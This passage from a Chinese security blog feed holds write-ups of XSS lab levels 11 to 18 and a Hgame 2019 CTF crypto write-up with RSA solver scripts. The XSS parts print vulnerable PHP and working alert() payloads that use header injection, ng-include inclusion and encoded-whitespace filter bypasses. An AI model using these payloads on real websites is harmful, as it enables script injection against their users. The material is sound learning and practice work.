</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那这一关肯定又是在t_ref上做文章…先看看它的值是什么：<code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];</code>发现是上一个跳转页面的url，而且过滤掉了<code>&lt; &gt;</code>，其实也好办…和上一个是一个套路，就是直接闭合引号，然后添加事件属性构造弹窗，接着覆盖type即可，只不过这一步需要从上一个页面用bp抓包去修改参数…</p><p>上一个页面即将跳转时抓包：</p><p><a href="https://imgchr.com/i/AyFOWn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/01/AyFOWn.md.png" alt="AyFOWn.md.png"></a></p><p>修改Referer请求头，forward一下，即可构成弹窗事件；：</p><p><img src="https://s2.ax1x.com/2019/04/01/AykQFH.png" alt="AykQFH.png"></p><p>payload:<code>Referer: &quot; onkeypress=&quot;alert(&#39;xss&#39;)&quot; type=&quot;text&quot;</code></p><h2 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>基本上换汤不换药，就是从上一题的Referer请求头参数变成了UA头……</p><p><a href="https://imgchr.com/i/Ayk20U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/01/Ayk20U.md.png" alt="Ayk20U.md.png"></a></p><p>直接用上一关的payload即可</p><p>payload：<code>User-Agent: &quot; onkeypress=&quot;alert(&#39;xss&#39;)&quot; type=&quot;text&quot;</code></p><h2 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现又有一个新参数cookie…套路一样，不多说</p><p>payload：<code>Cookie: user=&quot; onkeypress=&quot;alert(&#39;xss&#39;)&quot; type=&quot;text&quot;</code></p><h2 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h2><p>查看源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现链接:<code>www.exifviewer.org</code>；应该是个漏洞环境…但是可能下线了…没有办法做，但是也可以了解一波；</p><p>这个漏洞是利用上传图片的Exif（可以记录数码照片的属性信息和拍摄数据，Exif信息是可以被任意编辑的）值进行构造xss（真的是骚），也算是个存储型xss；</p><p>附上此漏洞的乌云镜像链接：<a href="http://www.anquan.us/static/bugs/wooyun-2012-07468.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2012-07468.html</a></p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h2><p>摸不着头脑…只好查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现是使用了一个<code>ng-include</code>指令，先来了解一下用法：</p><p><a href="https://imgchr.com/i/A60n1J" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/02/A60n1J.md.png" alt="A60n1J.md.png"></a></p><p>也就是常说的文件包含，先包含一个同一个目录下的文件试一下：</p><p><a href="https://imgchr.com/i/A6sGqA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/02/A6sGqA.md.png" alt="A6sGqA.md.png"></a></p><p>发现已经出现第三关的页面，这里要注意的是，字符串经过了htmlspecialchars()函数，所以尽量不要使用payload里出现<code>&lt;&gt;</code>的关卡</p><p>payload：<code>?src=&quot;level3.php?keyword=&#39; onkeypress=&#39;alert(2333)&quot;</code></p><h2 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现过滤了<code>script,空格，/</code>，script被转义，那我们可以换一种标签img，这样的话也不需要使用/，一举多得，但是还有一个问题就是空格如何绕过，这里采取编码的方式，用<code>%0d</code> <code>%0a</code> 进行绕过</p><p>payload：<code>?keyword=&lt;img%0dsrc=1%0donerror=&quot;alert(2333)&quot;&gt;</code></p><h2 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现是\<embed> 标签，用来定义嵌入的内容，比如插件；这里我们可以使用html事件属性去构造弹窗；</p><p>payload：<code>?arg01=a&amp;arg02=b onmouseover=alert(23333)</code></p><h2 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和上题一毛一样…不再赘述；</p><p>payload：<code>?arg01=a&amp;arg02=b onmouseover=alert(2333)</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;XSS-初体验~
    
    </summary>
    
      <category term="靶场通关笔记" scheme="https://gardenia30.top/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="XSS" scheme="https://gardenia30.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Web安全-XSS学习笔记</title>
    <link href="https://gardenia30.top/2019/04/03/Web%E5%AE%89%E5%85%A8-XSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/04/03/Web安全-XSS学习笔记/</id>
    <published>2019-04-03T03:20:25.000Z</published>
    <updated>2019-04-07T14:13:41.595Z</updated>
    
    <content type="html"><![CDATA[<p>开坑，待更~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;开坑，待更~&lt;/p&gt;

      
    
    </summary>
    
      <category term="Web安全学习笔记" scheme="https://gardenia30.top/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="XSS" scheme="https://gardenia30.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="https://gardenia30.top/2019/03/13/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/03/13/docker学习笔记/</id>
    <published>2019-03-13T00:21:52.000Z</published>
    <updated>2019-04-09T09:27:52.904Z</updated>
    
    <content type="html"><![CDATA[<p>开坑，待更……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;开坑，待更……&lt;/p&gt;

      
    
    </summary>
    
      <category term="环境部署" scheme="https://gardenia30.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="docker" scheme="https://gardenia30.top/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Hgame-2019几道有趣的RSA</title>
    <link href="https://gardenia30.top/2019/03/02/Hgame-2019%E5%87%A0%E9%81%93%E6%9C%89%E8%B6%A3%E7%9A%84Crypto/"/>
    <id>https://gardenia30.top/2019/03/02/Hgame-2019几道有趣的Crypto/</id>
    <published>2019-03-02T11:45:35.000Z</published>
    <updated>2019-03-03T07:51:31.689Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>信安数论问题…<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><blockquote><p>e = 12<br>p = 58380004430307803367806996460773123603790305789098384488952056206615768274527<br>q = 81859526975720060649380098193671612801200505029127076539457680155487669622867<br>ciphertext = 206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460<br>算出的m转化成字符串</p></blockquote><p>说实话这题本来以为很简单的，想直接求私钥，直接求解，没想到算出来φ(n)和e=12不互素，无法求出e对应的公钥，所以直接解是没有办法的；</p><p>解法如下：</p><p><a href="https://imgchr.com/i/kquFSI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/02/kquFSI.md.jpg" alt="kquFSI.md.jpg"></a></p><p>解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">e = <span class="number">12</span></span><br><span class="line">p = <span class="number">58380004430307803367806996460773123603790305789098384488952056206615768274527</span></span><br><span class="line">q = <span class="number">81859526975720060649380098193671612801200505029127076539457680155487669622867</span></span><br><span class="line">ciphertext = <span class="number">206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span></span><br><span class="line">n=p*q</span><br><span class="line">ol=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(<span class="number">3</span>,ol)</span><br><span class="line">ciphertext1=pow(ciphertext,d,n)</span><br><span class="line">ans=rabin_decrypt(ciphertext1,p,q,e=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">temp=rabin_decrypt(i,p,q,e=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> temp:</span><br><span class="line">flag=<span class="string">'&#123;:x&#125;'</span>.format(x).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> flag:</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h2><blockquote><p>m为17位十进制数，提交格式hgame{m}</p><p>e1:0x33240</p><p>e2:0x3e4f</p><p>n:0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329893f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac5dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb11964970659cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356854eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1</p><p>c1:0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9a605fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c770ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2da636f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9e28608ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618c6e81c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab8708d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c72160675d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d</p><p>c2:0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b7942214dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c38031d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cabf83f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3cc4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe89e3f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9fcbd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac670946356b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6</p><p>c1=pow(m, e1, n)<br>c2=pow(m, e2, n)</p></blockquote><p>先转化为10进制，发现e1=209472，e2=15951，e1,e2不互素，最大公因数为3；本想用共模攻击，但是e1和e2不互素，没办法达到共模攻击的条件，但是仔细推来发现：</p><blockquote><p>gcd(e1,e2)=3，则gcd(e1/3,e2/3)=1</p><p>所以令a1=e1/3,a2=e2/3，则gcd(a1,a2)=1</p><p>所以存在r*a1+s*a2=1，所以r*e1+s*e2=3 (扩展欧几里得算法)</p><p>则(c1^r)*(c2^s)=(m^(r*e1))<em>(m^(s\</em>e2))=m^(r*e1+s*e2)=m^3 //共模攻击</p><p>所以到此为止：(m^3) mod n=(c1^r)*(c2^s) mod n 为已知数</p><p>所以直接低指数攻击即可</p></blockquote><p>上解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">same_attack</span><span class="params">(e1,e2,mess1,mess2,n)</span>:</span></span><br><span class="line">gcd,s,t=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="keyword">if</span> s&lt;<span class="number">0</span>:</span><br><span class="line">s=-s</span><br><span class="line">mess1=gmpy2.invert(mess1,n)</span><br><span class="line"><span class="keyword">if</span> t&lt;<span class="number">0</span>:</span><br><span class="line">t=-t</span><br><span class="line">mess2=gmpy2.invert(mess2,n)</span><br><span class="line">mess=gmpy2.powmod(mess1,s,n)*gmpy2.powmod(mess2,t,n)%n</span><br><span class="line"><span class="keyword">return</span> mess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_attack</span><span class="params">(c,n,e)</span>:</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(gmpy2.iroot(c+i*n, e)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        x = gmpy2.iroot(c+i*n, e)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> x</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">e1=<span class="string">"0x33240"</span></span><br><span class="line">e2=<span class="string">"0x3e4f"</span></span><br><span class="line">n=<span class="string">"0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329893f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac5dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb11964970659cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356854eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1"</span></span><br><span class="line">c1=<span class="string">"0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9a605fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c770ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2da636f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9e28608ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618c6e81c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab8708d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c72160675d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d"</span></span><br><span class="line">c2=<span class="string">"0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b7942214dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c38031d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cabf83f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3cc4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe89e3f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9fcbd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac670946356b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6"</span></span><br><span class="line">e1=int(e1,<span class="number">16</span>)/<span class="number">3</span></span><br><span class="line">e2=int(e2,<span class="number">16</span>)/<span class="number">3</span></span><br><span class="line">n=int(n,<span class="number">16</span>)</span><br><span class="line">c1=int(c1,<span class="number">16</span>)</span><br><span class="line">c2=int(c2,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># print gmpy2.gcd(e1,e2)</span></span><br><span class="line">ans=same_attack(e1,e2,c1,c2,n)</span><br><span class="line"><span class="comment"># print ans </span></span><br><span class="line">small_attack(ans,n,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>加上“hgame”即可得到flag：</p><p><img src="https://s2.ax1x.com/2019/03/03/kLDs9s.png" alt="kLDs9s.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;信安数论问题…
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>杭电Hgame-2019-week2-WP</title>
    <link href="https://gardenia30.top/2019/02/23/%E6%9D%AD%E7%94%B5HGAME-WEEK2-WP/"/>
    <id>https://gardenia30.top/2019/02/23/杭电HGAME-WEEK2-WP/</id>
    <published>2019-02-23T08:06:51.000Z</published>
    <updated>2019-03-03T07:46:32.124Z</updated>
    
